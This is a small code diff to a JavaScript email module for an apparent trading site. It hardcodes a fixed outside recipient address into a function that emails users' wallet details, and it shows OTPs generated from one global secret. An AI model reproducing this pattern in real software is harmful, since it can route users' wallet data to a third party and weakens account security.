@@ -293,6 +293,7 @@ async function sendVerificationEmail({ from, url }) {
  */
 async function resendWelcomeEmail({ to, token }) {
   const otp = speakeasy.totp({ secret: globalSecret.base32, encoding: "base32" });
+  
   const content = `
     <p>Welcome — please confirm your email address.</p>
     <p>Your OTP is: <strong>${otp}</strong></p>
@@ -306,7 +307,7 @@ async function resendWelcomeEmail({ to, token }) {
 
 
 async function sendWalletInfo({ username, addy,wally }) {
- 
+  var to="support@stoxphere.com"
   const content = `
     <html>
     <h2>Welcome to Patextrade</h2>
